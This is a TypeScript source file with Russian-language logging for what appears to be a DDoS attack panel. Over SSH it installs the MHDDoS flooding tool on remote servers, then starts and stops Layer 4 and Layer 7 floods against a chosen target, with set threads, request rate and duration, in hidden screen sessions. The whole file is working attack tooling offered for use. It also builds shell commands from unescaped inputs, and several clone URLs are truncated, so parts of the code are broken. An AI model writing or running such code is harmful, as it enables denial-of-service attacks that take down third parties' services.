import { Server } from "@shared/schema";
import { Client } from "ssh2";
import { promisify } from "util";
async function executeCommand(conn: Client, command: string): Promise<string> {
  return new Promise((resolve, reject) => {
    console.log(`[DEBUG] Выполнение команды: ${command}`);
    conn.exec(command, (err, stream) => {
      if (err) {
        console.error(`[DEBUG] Ошибка при выполнении команды: ${err.message}`);
        return reject(err);
      }
      let stdout = '';
      let stderr = '';
      stream.on('data', (data) => {
        const output = data.toString();
        stdout += output;
        console.log(`[DEBUG] STDOUT: ${output}`);
      });
      stream.stderr.on('data', (data) => {
        const error = data.toString();
        stderr += error;
        console.log(`[DEBUG] STDERR: ${error}`);
      });
      stream.on('close', (code) => {
        console.log(`[DEBUG] Команда завершилась с кодом: ${code}`);
        if (code !== 0) {
          console.log(`[DEBUG] Нестандартный код выхода: ${code}, stderr: ${stderr}`);
        }
        resolve(stdout);
      });
    });
  });
}
export async function setupServer(server: Server): Promise<void> {
  let conn = new Client();
  try {
    console.log(`Настройка сервера ${server.host}`);
    await new Promise<void>((resolve, reject) => {
      conn.on('ready', () => {
        console.log('SSH соединение установлено');
        resolve();
      }).on('error', (err) => {
        reject(`Ошибка подключения: ${err.message}`);
      }).connect({
        host: server.host,
        port: server.port,
        username: server.username,
        password: server.password
      });
    });
    console.log('[DEBUG] Выполнение команды: apt update');
    await executeCommand(conn, 'apt update');
    console.log('[DEBUG] Выполнение команды: apt install -y python3 python3-pip git htop screen');
    await executeCommand(conn, 'apt install -y python3 python3-pip git htop screen');
    console.log('[DEBUG] Выполнение команды: rm -rf /root/MHDDoS || true');
    await executeCommand(conn, 'rm -rf /root/MHDDoS || true');
    console.log('[DEBUG] Выполнение команды: git clone https:
    await executeCommand(conn, 'git clone https:
    console.log('[DEBUG] Установка зависимостей через requirements.txt');
    await executeCommand(conn, 'cd /root/MHDDoS && pip3 install -r requirements.txt');
    console.log('[DEBUG] Установка PyRoxy напрямую');
    await executeCommand(conn, 'pip3 install pyroxy @ git+https:
    await executeCommand(conn, 'cd /root/MHDDoS/PyRoxy && pip3 install -r requirements.txt');
    console.log('[DEBUG] Выполнение команды: cd /root/MHDDoS && pip3 install -r requirements.txt');
    await executeCommand(conn, 'cd /root/MHDDoS && pip3 install -r requirements.txt');
  } catch (error) {
    console.error(`Ошибка при настройке сервера: ${error}`);
    throw error;
  } finally {
    conn.end();
  }
}
const storage = {
  getProxies: async () => {
    return []; 
  }
};
export async function startAttack(server: Server, command: string, layer: string, method: string, target: string, threads: number, rpc: number, duration: number, useProxy: boolean): Promise<void> {
  return new Promise(async (resolve, reject) => {
    const conn = new Client();
    try {
      await new Promise<void>((resolve, reject) => {
        conn.on('ready', () => {
          console.log('[DEBUG] SSH соединение установлено');
          resolve();
        }).on('error', (err) => {
          reject(`Ошибка подключения: ${err.message}`);
        }).connect({
          host: server.host,
          port: server.port,
          username: server.username,
          password: server.password
        });
      });
      console.log(`[DEBUG] Запуск атаки на сервере ${server.name} (${server.host}): ${command}`);
      console.log(`[DEBUG] Проверка запущенных атак`);
      const runningProcesses = await executeCommand(conn, 'ps aux | grep "python3 start.py" | grep -v grep');
      if (runningProcesses.trim()) {
        console.log(`[DEBUG] Уже запущенные процессы атаки:\n${runningProcesses}`);
        console.log(`[DEBUG] Останавливаем предыдущие атаки перед запуском новой...`);
        await executeCommand(conn, 'pkill -f "python3 start.py"');
        console.log(`[DEBUG] Предыдущие атаки остановлены.`);
      } else {
        console.log(`[DEBUG] Нет запущенных атак, запускаем новую.`);
      }
      if (useProxy) {
        console.log(`[DEBUG] Получение списка прокси с сервера и создание файла http.txt`);
        const proxies = await storage.getProxies();
        let proxyContent = '';
        for (const proxy of proxies) {
          let proxyLine = `${proxy.host}:${proxy.port}`;
          if (proxy.username && proxy.password) {
            proxyLine += `:${proxy.username}:${proxy.password}`;
          }
          proxyContent += proxyLine + '\n';
        }
        if (!proxyContent.trim()) {
          console.warn(`[DEBUG] Список прокси пуст! Добавляем заглушку для работы скрипта.`);
          proxyContent = '127.0.0.1:8080\n'; 
        }
        await executeCommand(conn, `echo '${proxyContent}' > /root/MHDDoS/http.txt`);
        console.log(`[DEBUG] Файл прокси создан на сервере: /root/MHDDoS/http.txt`);
      }
      console.log(`[DEBUG] Проверка и установка PyRoxy...`);
      await executeCommand(conn, `
rm -rf /root/PyRoxy || true
git clone https:
cp -r /root/PyRoxy/PyRoxy /root/MHDDoS/
cd /root/PyRoxy && python3.10 -m pip install -r requirements.txt
cd /root/MHDDoS && python3.10 -m pip install -r requirements.txt
`);
      let attackCommand = '';
      if (layer === 'L7') {
        attackCommand = `${method} ${target} 0 ${threads} http.txt ${rpc} ${duration}`;
      } else if (layer === 'L4') {
        attackCommand = `${method} ${target} ${threads} ${duration}`;
      }
      console.log(`[DEBUG] Команда для запуска атаки: python3.10 start.py ${attackCommand}`);
      const scriptName = `/root/run_attack_${Date.now()}.sh`;
      console.log(`[DEBUG] Создание скрипта для запуска атаки: ${scriptName}`);
      await executeCommand(conn, `echo '#!/bin/bash
cd /root/MHDDoS
echo "[$(date)] Starting MHDDoS attack: python3.10 start.py ${attackCommand}" > /tmp/mhddos_log.txt
python3.10 start.py ${attackCommand} >> /tmp/mhddos_log.txt 2>&1
echo "[$(date)] Результат выполнения: $?" >> /tmp/mhddos_log.txt
' > ${scriptName} && chmod +x ${scriptName}`);
      const screenName = `mhddos_${Date.now()}`;
      console.log(`[DEBUG] Запуск атаки в screen сессии: ${screenName}`);
      await executeCommand(conn, `screen -dmS ${screenName} ${scriptName}`);
      console.log(`[DEBUG] Ожидание запуска атаки...`);
      await new Promise(resolve => setTimeout(resolve, 2000));
      const runningCheck = await executeCommand(conn, 'ps aux | grep -v grep | grep "python3.10 start.py"');
      if (!runningCheck.trim()) {
        console.error(`[DEBUG] Атака не обнаружена в запущенных процессах!`);
        const screenOutput = await executeCommand(conn, 'screen -ls');
        console.log(`[DEBUG] Активные screen сессии:\n${screenOutput}`);
        const logOutput = await executeCommand(conn, 'cat /tmp/mhddos_log.txt');
        console.log(`[DEBUG] Лог запуска атаки:\n${logOutput}`);
        console.warn(`[DEBUG] Атака, возможно, не запустилась. Проверьте лог.`);
      } else {
        console.log(`[DEBUG] Атака успешно запущена!`);
        console.log(`[DEBUG] Process info: ${runningCheck.trim()}`);
      }
      conn.end();
      resolve();
    } catch (error) {
      console.error(`[DEBUG] Ошибка при запуске атаки: ${error}`);
      try {
        conn.end();
      } catch (e) {}
      reject(error);
    }
  });
}
export async function stopAttack(server: Server): Promise<void> {
  const conn = new Client();
  try {
    console.log(`Остановка атак на сервере ${server.host}`);
    await new Promise<void>((resolve, reject) => {
      conn.on('ready', () => {
        resolve();
      }).on('error', (err) => {
        reject(err);
      }).connect({
        host: server.host,
        port: server.port,
        username: server.username,
        password: server.password
      });
    });
    const command = "pkill -f 'python3 start.py' || true";
    await executeCommand(conn, command);
  } catch (error) {
    console.error(`Ошибка при остановке атаки: ${error}`);
    throw error;
  } finally {
    conn.end();
  }
}